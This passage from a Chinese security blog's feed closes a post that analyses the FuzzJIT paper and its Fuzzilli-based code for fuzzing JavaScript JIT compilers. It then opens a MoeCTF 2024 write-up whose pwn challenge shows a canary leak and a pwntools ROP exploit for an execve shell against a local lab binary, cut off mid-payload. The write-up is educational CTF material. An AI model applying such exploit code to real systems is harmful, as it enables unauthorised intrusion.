类型的变量，它是对对象的引用&#x2F;指针，该对象通常与一组属性相关联，属性的形式为键值对，以及一个方法列表。 在这里，键是原始类型，而值可以是任何类型，无论是原始类型还是非原始类型。 彻底比较两个对象的成本很高。 鉴于比较包含在测试用例中，复杂的计算也会降低模糊测试速度。 在这里，我们专注于比较键值对，因为它们是在程序中进行操作的主要特征。</p><p>deepEquals() 函数（参见第 1 行）深度且递归地比较任意类型的两个变量。 不同类型的变量永远不会相同。 用于比较相同数据类型的变量的归纳规则如表 2 所示。 请注意，这些规则不是代码，并且所有比较语句都意味着必须进行比较检查。 仅当递归执行期间遇到的每个比较都返回 true 时，两个变量才相同。 原始类型的规则都是基本情况，不需要递归调用。 特别是，考虑了数字类型的两个特殊情况，其中<code>“===”</code>未能区分 0 和 -0，并将任何涉及 NaN (Not-A-Number) 的比较视为不相等。 区分 0 和 -0 在某些数学计算中很重要，例如除法和 atan2，并且一些 JIT 编译器错误是由它们的误用引起的，这意味着捕获它是一个有意义的不一致； Object.is() 能够区分它们。 NaN 表示数学计算失败，并且它与<code>“===”</code>的比较规则会产生误报，即不必要的不一致，其中两个 NaN 被认为不相等。 在这里，我们将其修正为相等。 对于对象类型，我们考虑常用的类，并根据它们是否可以使用相同的规则进行比较对它们进行分组。 主要包装原始类型变量的类，例如 Date 和 String，可以基于它们的 toString() 值进行比较。 在这里，我们使用 valueOf() 函数将 Number 对象精确地转换为其对应的原始类型，并将比较委托给原始数字的规则。 否则，如果两个对象共享相同的属性列表（由 Object.keys() 返回），并且每个属性的值完全相同，则这两个对象是相同的。 为了平衡性能，deepEquals() 函数考虑了大多数常见错误，而不是尝试捕获所有可能的不一致之处。</p><p><strong>消除误报</strong>。 即使使用相同的参数，在一次运行中两次执行同一函数也并不一定会产生相同的执行结果，因为它们的调用上下文可能会因某些执行副作用而异，例如，更改函数也使用的全局变量。导致不同执行结果的其他因素包括生成随机数（例如，Math.random()）、读取当前时间（例如，Date.now()）和并发。在审核 JIT 编译器的正确性时，不应将此类不一致计算在内。我们消除了这些烦人的影响以避免误报。可以通过各种 JavaScript 引擎的命令标志禁用并发功能。对于其他因素，我们提出了一种双管齐下的方法来有效且可靠地解决它们。我们创建一个令人不安的 API 黑名单，并在突变期间阻止它们的生成。另一方面，我们通过连续执行该函数几次来预先检查这些因素是否存在，并查看最终状态是否存在任何差异（参见图 6 中的第 17 到 20 行）。只有通过预先检查的测试用例才会被转发以测试 JIT 编译器。黑名单提高了获得有效测试用例的成功率并确保了模糊测试效率。拥有完整的黑名单并非易事，预先检查是为了有效地切断不合格的测试用例。我们还小心地控制执行迭代次数以使其较小，并避免激活 JIT 编译器。</p><h2 id="5-评估"><a href="#5-评估" class="headerlink" title="5 评估"></a>5 评估</h2><p><strong>测试对象。</strong> 我们选择了四个主流 JavaScript 引擎，即 Safari 中的 JavaScriptCore (JSC)、Chrome 中的 V8、Firefox 中的 SpiderMonkey (SM) 以及 Edge 中的 ChakraCore (CH)（在 2021 年 3 月之前，目前处于维护模式），并使用它们 2021 年 12 月的最新版本（当我们开始实验时）作为测试对象来评估我们的方法。 这些 JavaScript 引擎都具有大型代码库，其中 JIT 模块做出了重大贡献。 在表 3 中，我们列出了每个对象中的代码总行数和函数数量，以及其 JIT 模块中的代码总行数和函数数量，并且我们还显示了 JIT 模块的贡献百分比。 就代码行数而言，四个对象中 JIT 模块实现的占比范围从 16.67% 到 28.91%。 平均而言，JIT 模块占所有源代码行的近四分之一，这表明 JIT 编译器的复杂性和重要性。 探索 JIT 编译器并在其中发现错误具有重要的需求。 这些 JavaScript 引擎都经过了其质量保证团队和野生安全研究人员的详尽的手动审核和测试。 FuzzJIT 检测到的任何新错误都是从所有早期检查中逃脱的，这证明了我们方法的有效性。</p><p><strong>实现和设置。</strong> 我们基于 Fuzzilli实现了 FuzzJIT。 Fuzzilli 是一个用于 JavaScript 引擎的覆盖引导模糊器，它基于自定义中间语言 FuzzIL，可以对其进行突变并将其转换为 JavaScript。 FuzzIL 不是突变 AST 或程序的其他语法元素，而是方便地对程序的控制和数据流进行突变。 FuzzIL 程序包含指令列表，并且可以提升为 JavaScript 程序以进行测试。 据报道，Fuzzilli 在六个 JavaScript 引擎中发现了 51 个错误 9，并且被学术研究人员和行业从业者广泛采用来构建强大的 JavaScript 模糊器。 我们利用其基本模糊测试工具，包括代码覆盖反馈和执行结果分析，并自定义输入突变模块以生成我们的 JIT 错误揭示元素并添加新的输入包装模块（参见图 5）。 我们的评估环境是一个 Ubuntu 20.04 系统，运行在具有 64GB RAM 的 i9-10900K CPU 上。</p><hr><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>FuzzJIT是在fuzzilli的基础上改的，并且应该是在<code>0.9.2</code>或此之前的某个commit上改的。最直接的修改就是修改了各个测试引擎的<code>Profile</code>，以V8为例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 获取object的准确类型</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">classOf</span>(<span class="hljs-params">object</span>) &#123;<br>    <span class="hljs-keyword">var</span> string = <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(object);<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">8</span>, string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// 深入比较两个对象，包括它们的属性和值，确保两个对象完全一致。</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepObjectEquals</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-comment">// 获取a和b的所有属性键</span><br>    <span class="hljs-keyword">var</span> aProps = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(a);<br>    aProps.<span class="hljs-title function_">sort</span>();<br>    <span class="hljs-keyword">var</span> bProps = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(b);<br>    bProps.<span class="hljs-title function_">sort</span>();<br>    <span class="hljs-comment">// 比较a和b的所有属性键</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">deepEquals</span>(aProps, bProps)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// 比较a和b的所有属性值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; aProps.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">deepEquals</span>(a[aProps[i]], b[aProps[i]])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepEquals</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-comment">// 若a和b是相同的基本类型和值，那么a和b是严格相等的</span><br>    <span class="hljs-keyword">if</span> (a === b) &#123;<br>        <span class="hljs-keyword">if</span> (a === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> / a) === (<span class="hljs-number">1</span> / b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果类型不同那么a和b是不相等的</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> a != <span class="hljs-keyword">typeof</span> b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 如果是数字，额外处理NaN的特殊情况</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> a == <span class="hljs-string">&#x27;number&#x27;</span>) <span class="hljs-keyword">return</span> (<span class="hljs-built_in">isNaN</span>(a) &amp;&amp; <span class="hljs-built_in">isNaN</span>(b)) || (a===b);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> a !== <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> a !== <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> a !== <span class="hljs-string">&#x27;symbol&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 获取a的类型</span><br>    <span class="hljs-keyword">var</span> objectClass = <span class="hljs-title function_">classOf</span>(a);<br>    <span class="hljs-comment">// 如果是数组，那么递归比较a和b的每个数组元素是否严格相等。</span><br>    <span class="hljs-keyword">if</span> (objectClass === <span class="hljs-string">&#x27;Array&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (a.<span class="hljs-property">length</span> != b.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">deepEquals</span>(a[i], b[i])) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;         <br>    <span class="hljs-keyword">if</span> (objectClass !== <span class="hljs-title function_">classOf</span>(b)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 如果是正则表达式类型，那么转换成字符串比较</span><br>    <span class="hljs-keyword">if</span> (objectClass === <span class="hljs-string">&#x27;RegExp&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> (a.<span class="hljs-title function_">toString</span>() === b.<span class="hljs-title function_">toString</span>());<br>    &#125;<br>    <span class="hljs-comment">// 函数类型，则认为是严格相等</span><br>    <span class="hljs-keyword">if</span> (objectClass === <span class="hljs-string">&#x27;Function&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-comment">// 如果是数据类型，那么比较它们的值。</span><br>    <span class="hljs-keyword">if</span> (objectClass == <span class="hljs-string">&#x27;String&#x27;</span> || objectClass == <span class="hljs-string">&#x27;Number&#x27;</span> ||<br>        objectClass == <span class="hljs-string">&#x27;Boolean&#x27;</span> || objectClass == <span class="hljs-string">&#x27;Date&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (a.<span class="hljs-title function_">valueOf</span>() !== b.<span class="hljs-title function_">valueOf</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果以上类型都不是，则进一步调用deepObjectEquals()比较a和b，将他们的键值分别进行比较。</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">deepObjectEquals</span>(a, b);<br>&#125;<br><span class="hljs-comment">// 生成的opt函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">opt</span>(<span class="hljs-params">opt_param</span>)&#123;<br>    <span class="hljs-comment">// ....</span><br>&#125;<br><span class="hljs-keyword">let</span> jit_a0 = <span class="hljs-title function_">opt</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-title function_">opt</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">let</span> jit_a0_0 = <span class="hljs-title function_">opt</span>(<span class="hljs-literal">false</span>);<br>%<span class="hljs-title class_">PrepareFunctionForOptimization</span>(opt);<br><span class="hljs-keyword">let</span> jit_a1 = <span class="hljs-title function_">opt</span>(<span class="hljs-literal">true</span>);<br>%<span class="hljs-title class_">OptimizeFunctionOnNextCall</span>(opt);<br><span class="hljs-keyword">let</span> jit_a2 = <span class="hljs-title function_">opt</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (jit_a0 === <span class="hljs-literal">undefined</span> &amp;&amp; jit_a2 === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-title function_">opt</span>(<span class="hljs-literal">true</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (jit_a0_0===jit_a0 &amp;&amp; !<span class="hljs-title function_">deepEquals</span>(jit_a0, jit_a2)) &#123;<br>        <span class="hljs-title function_">fuzzilli</span>(<span class="hljs-string">&#x27;FUZZILLI_CRASH&#x27;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关于<code>opt</code>函数，是FuzzJIT生成&#x2F;变异出来的，<del>那么关于参数<code>true</code>和<code>false</code>显然是控制是否触发JIT优化的开关。</del>（这个<code>true</code>和<code>false</code>可能是为了触发函数调用时带一个参数以触发带参数的函数调用吧，我强行解释一下O.o）那么紧接着看看变异器它是怎么做的。先看看变异器启动了哪些：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> mutators = <span class="hljs-title class_">WeightedList</span>([<br>    <span class="hljs-comment">//(ExplorationMutator(),              3),</span><br>    <span class="hljs-comment">//(CodeGenMutator(),                  2),</span><br>    <span class="hljs-comment">//(SpliceMutator(),                   2),</span><br>    (<span class="hljs-title class_">InputMutator</span>(<span class="hljs-attr">isTypeAware</span>: <span class="hljs-literal">false</span>),  <span class="hljs-number">2</span>),<br>    (<span class="hljs-title class_">InputMutator</span>(<span class="hljs-attr">isTypeAware</span>: <span class="hljs-literal">true</span>),   <span class="hljs-number">1</span>),<br>    <span class="hljs-comment">// Can be enabled for experimental use, ConcatMutator is a limited version of CombineMutator</span><br>    <span class="hljs-comment">// (ConcatMutator(),                1),</span><br>    (<span class="hljs-title class_">OperationMutator</span>(),                <span class="hljs-number">1</span>),<br>    (<span class="hljs-title class_">CombineMutator</span>(),                  <span class="hljs-number">1</span>),<br>    (<span class="hljs-title class_">JITStressMutator</span>(),                <span class="hljs-number">1</span>),<br>])<br></code></pre></td></tr></table></figure><p>它注释掉了<code>ExplorationMutator</code>，<code>CodeGenMutator</code>和<code>SpliceMutator</code>，我感觉不用注释掉啊，<del>作者注释掉这些变异器是因为生成测试用例的时候，很有可能会生成没有<code>return</code>的种子，且由于这三种变异器发现”interesting”的种子能力更强，那么种子池中就会出现大量的由这些Mutator生成的种子，那么对于<code>Profile</code>中的模板就没有意义了。</del></p><p><strong>但是，直观的能让人感觉这个FuzzJIT是无法达到很高的代码覆盖率的，起码和fuzzilli对比是做不到的，因为fuzzilli的HybridEngine不仅仅会用到ProgramTemplate，还有用到MutationEngin进行覆盖率提升导向的变异</strong></p><p>所以，笔者有疑问：</p><ol><li>以覆盖率为导向的JIT编译器fuzz是否是有效的呢？给我的直观感受是，由于插桩针对的是整个V8，因此覆盖率导向是以整个V8来说的，那么我想要测试JIT部分的话，甚至会出现不触发JIT优化而<code>interesting</code>的种子。那么能量总会集中在这些不触发JIT的种子。所以fuzzilli有一个Profile+ProgramTemplate来触发JIT优化，并且每个Template都是一种特定的特性。</li><li>倘若不对整个引擎插桩编译，而只针对于JIT优化进行插桩呢？以当前浏览器引擎的复杂程度，这是一个复杂而漫长的工作。</li><li>如果只对JIT编译部分进行插桩的话，随着fuzzing进行，覆盖率和BUG触发率的关系是否紧密呢？</li></ol><p>其实核心问题就是：我要挖的洞是<code>JIT</code>的，但是覆盖率引导的方向是整个引擎的。</p><p>那么就类似于FuzzJIT，针对某一个优化设计出来的模板，能够发现优化的特定漏洞，但是显然覆盖率就低。覆盖率与漏洞触发率没有必然关系了。</p><p>那为什么用户态程序它的BUG发生率和覆盖率结合比较紧密呢？因为它的变异器是比较精细的，在字节层级，甚至位层级进行的变异操作，只要覆盖到路径了，那么就有可能触发潜在bug。但是这里的变异器是十分粗糙的，触发bug的原因是因为特定的程序结构。</p><p>那么在后面的fuzzilli维护更新中针对于这类优化漏洞是有模板实现的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript">fileprivate <span class="hljs-keyword">let</span> <span class="hljs-title class_">FastApiCallFuzzer</span> = <span class="hljs-title class_">ProgramTemplate</span>(<span class="hljs-string">&quot;FastApiCallFuzzer&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    b.<span class="hljs-title function_">buildPrefix</span>()<br>    b.<span class="hljs-title function_">build</span>(<span class="hljs-attr">n</span>: <span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">let</span> parameterCount = <span class="hljs-title function_">probability</span>(<span class="hljs-number">0.5</span>) ? <span class="hljs-number">0</span> : <span class="hljs-title class_">Int</span>.<span class="hljs-title function_">random</span>(<span class="hljs-attr">in</span>: <span class="hljs-number">1.</span>.<span class="hljs-number">.4</span>)<br><br>    <span class="hljs-keyword">let</span> f = b.<span class="hljs-title function_">buildPlainFunction</span>(<span class="hljs-params"><span class="hljs-keyword">with</span>: .parameters(n: parameterCount)</span>) &#123; args <span class="hljs-keyword">in</span><br>        b.<span class="hljs-title function_">build</span>(<span class="hljs-attr">n</span>: <span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">let</span> target = fastCallables.<span class="hljs-title function_">randomElement</span>()!<br>        <span class="hljs-keyword">let</span> apiObj = b.<span class="hljs-title function_">findOrGenerateType</span>(target.<span class="hljs-property">group</span>)<br>        <span class="hljs-keyword">let</span> functionSig = <span class="hljs-title function_">chooseUniform</span>(<span class="hljs-attr">from</span>: b.<span class="hljs-title function_">methodSignatures</span>(<span class="hljs-attr">of</span>: target.<span class="hljs-property">method</span>, <span class="hljs-attr">on</span>: target.<span class="hljs-property">group</span>))<br>        <span class="hljs-keyword">let</span> apiCall = b.<span class="hljs-title function_">callMethod</span>(target.<span class="hljs-property">method</span>, <span class="hljs-attr">on</span>: apiObj, <span class="hljs-attr">withArgs</span>: b.<span class="hljs-title function_">findOrGenerateArguments</span>(<span class="hljs-attr">forSignature</span>: functionSig), <span class="hljs-attr">guard</span>: <span class="hljs-literal">true</span>)<br>        b.<span class="hljs-title function_">doReturn</span>(apiCall)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> args = b.<span class="hljs-title function_">randomVariables</span>(<span class="hljs-attr">n</span>: <span class="hljs-title class_">Int</span>.<span class="hljs-title function_">random</span>(<span class="hljs-attr">in</span>: <span class="hljs-number">0.</span>.<span class="hljs-number">.5</span>))<br>    b.<span class="hljs-title function_">callFunction</span>(f, <span class="hljs-attr">withArgs</span>: args)<br><br>    b.<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;%PrepareFunctionForOptimization(%@)&quot;</span>, <span class="hljs-attr">with</span>: [f]);<br><br>    b.<span class="hljs-title function_">callFunction</span>(f, <span class="hljs-attr">withArgs</span>: args)<br>    b.<span class="hljs-title function_">callFunction</span>(f, <span class="hljs-attr">withArgs</span>: args)<br><br>    b.<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;%OptimizeFunctionOnNextCall(%@)&quot;</span>, <span class="hljs-attr">with</span>: [f]);<br><br>    b.<span class="hljs-title function_">callFunction</span>(f, <span class="hljs-attr">withArgs</span>: args)<br><br>    b.<span class="hljs-title function_">build</span>(<span class="hljs-attr">n</span>: <span class="hljs-number">10</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>FuzzJIT仅针对于文章提及的四个浏览器引擎进行了测试，其他的引擎没有进行测试….给我的感觉是先有的漏洞才有的文章。而且对<code>fuzzilli</code>是没有改进的，是用fuzzilli的Profile模块挖了洞。</p><p>每次的<code>return</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> returnArr.<span class="hljs-property">count</span> != <span class="hljs-number">0</span> &amp;&amp; (w.<span class="hljs-title function_">getCurrentIndention</span>() == <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-comment">//for item in returnArr&#123;</span><br>    <span class="hljs-comment">//    w.emitComment(&quot; v\(item.0) : \(item.1)&quot;)</span><br>    <span class="hljs-comment">//&#125;</span><br>    w.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&quot;return v\(returnArr[returnArr.count-1].0);&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>它会返回生成的变量<code>v</code>列表中的最后一个，这块儿感觉很拖fuzz的效率，因为fuzzilli生成的变量并不是串接的，而是随机选择一个<code>v</code>然后类型推断再进行一些属性赋值或方法调用等操作。那么最后一个<code>v</code>就是随机的，而整个模板是对最后一个v进行JIT结果判定的，所以势必会浪费很多时间在这期间。</p>]]></content>
    
    
    <categories>
      
      <category>Paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Paper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Moe2024-wp</title>
    <link href="/2025/03/24/Moectf2024-wp/"/>
    <url>/2025/03/24/Moectf2024-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="NX-on"><a href="#NX-on" class="headerlink" title="NX_on"></a>NX_on</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// r8d</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+Ch] [rbp-24h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wellcome to MoeCTF2024!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This time.....&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NX is enabled!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your id?&quot;</span>);<br>  read(<span class="hljs-number">0LL</span>, v6, <span class="hljs-number">25LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Confirm your id:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(v6);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your real name?&quot;</span>);<br>  read(<span class="hljs-number">0LL</span>, &amp;buf2, <span class="hljs-number">256LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Use your real name as id?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;give me the size of your real name , 0 means quit&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdin</span>);<br>  _isoc99_scanf((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-string">&quot;%d&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;v5, v0, v1, v2, v3);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v5 &gt; <span class="hljs-number">16</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Number out of range!&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      j_memcpy(v6, &amp;buf2, v5);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v7 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>题目开启了NX和canary，显然可以泄露出来canary。因为v6在rbp - 32位置处，而能够输入25个字节，canary在rbp-8处。正好能够覆盖最低的一个字节，使得将canary泄露出来。</p><p>随后将buf又copy到了v6处，那么利用buf即可完成控制程序返回地址。</p><p>v5接收的时候是强转unsigned int那么传入-1即可。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">46281</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;B&#x27;</span><br>p.send(payload)<br>p.recvuntil(payload)<br>canary = p8(<span class="hljs-number">0</span>) + p.recv(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># ROP</span><br>syscall_addr = p64(<span class="hljs-number">0x0000000000402154</span>)<br>bin_sh_addr = p64(<span class="hljs-number">0x00000000004e3950</span>)<br>pop_rax = p64(<span class="hljs-number">0x00000000004508b7</span>)<br>pop_rdi = p64(<span class="hljs-number">0x000000000040239f</span>)<br>pop_rsi = p64(<span class="hljs-number">0x000000000040a40e</span>)<br>pop_rdx_rbx = p64(<span class="hljs-number">0x000000000049d12b</span>)<br><span class="hljs-comment"># pause()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + canary + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + pop_rax + p64(<span class="hljs-number">59</span>) + 